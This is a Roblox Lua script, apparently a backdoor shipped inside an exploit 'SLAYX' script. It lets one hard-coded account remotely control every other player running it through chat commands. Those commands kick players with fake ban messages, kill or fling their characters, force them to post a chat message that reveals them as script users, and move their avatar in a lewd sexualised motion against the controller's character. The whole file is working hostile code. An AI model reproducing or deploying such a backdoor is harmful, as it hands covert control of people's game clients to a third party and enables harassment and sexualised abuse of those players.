local mod = game.Players.SamuelBaker20
mod.Chatted:connect(function(cht)
	if cht:match(":rejoin .") then
		if game.Players.LocalPlayer ~= mod then
			 game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
		end
	end
 
end)

mod.Chatted:connect(function(cht)
	if cht:match(":pray .") then
		if game.Players.LocalPlayer ~= mod then
			 local PrayingAnimation = Instance.new("Animation", Folder)
    		PrayingAnimation.Name = "PrayingAnimation"
    		PrayingAnimation.AnimationId = "rbxassetid://3487719500"
    		local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
			Praying:Play()
		end
	end
 
end)

mod.Chatted:connect(function(cht)
	if cht:match(":dance2 .") then
		if game.Players.LocalPlayer ~= mod then
			local Dance2Animation = Instance.new("Animation", Folder)
   			Dance2Animation.Name = "Dance2Animation"
    		Dance2Animation.AnimationId = "rbxassetid://3189776546"
    		local Dance2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance2Animation)
			Dance2:Play()
		end
	end
 
end)

mod.Chatted:connect(function(cht)
	if cht:match(":dance1 .") then
		if game.Players.LocalPlayer ~= mod then
			local Dance1Animation = Instance.new("Animation", Folder)
    		Dance1Animation.Name = "Dance1Animation"
    		Dance1Animation.AnimationId = "rbxassetid://3189773368"
   			local Dance1 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance1Animation)
			Dance1:Play()
		end
	end
 
end)

mod.Chatted:connect(function(cht)
	if cht:match("/e find") then
		if game.Players.LocalPlayer ~= mod then
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm a proud SLAYX user!", 'All');
		end
	end
 
end)

mod.Chatted:connect(function(cht)
	if cht:match(":kick .") then
		if game.Players.LocalPlayer ~= mod then
			game.Players.LocalPlayer:Kick("Kicked by 2kdev") -- Change to Whatever (kick msg)
		end
	end
 
end)
 
mod.Chatted:connect(function(cht)
	if cht:match(":fling .") then
		if game.Players.LocalPlayer ~= mod then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			local power = 99999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
				game.Players.LocalPlayer.Character.Head.CanCollide = false
				game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
				game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end
 
end)
 
mod.Chatted:connect(function(cht)
	if cht:match(":benx .") then
	local player = game.Players.LocalPlayer
		if game.Players.LocalPlayer ~= mod then
			bending = true
                local segtarget = mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local Loop
                local loopFunction = function()
                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Crouch:Stop()
                end;
                Start()	
                repeat wait() until bending == false
                Pause()
		end
        if cht:match(":unbenx .") then
                if bending == true then
                    bending = false
                end
        end
	end
end)

mod.Chatted:connect(function(cht)
	if cht:match(":ban .") then
		if game.Players.LocalPlayer ~= mod then
			game.Players.LocalPlayer:kick("PERMA BAN")
		end
	end
 
end)
 
mod.Chatted:connect(function(cht)
	if cht:match(":kill .") then
		if game.Players.LocalPlayer ~= mod then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end
 
end)
 
mod.Chatted:connect(function(cht)
	if cht:match(":bring .") then
		if game.Players.LocalPlayer ~= mod then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(mod.Character.UpperTorso.Position)
		end
	end
 
end)
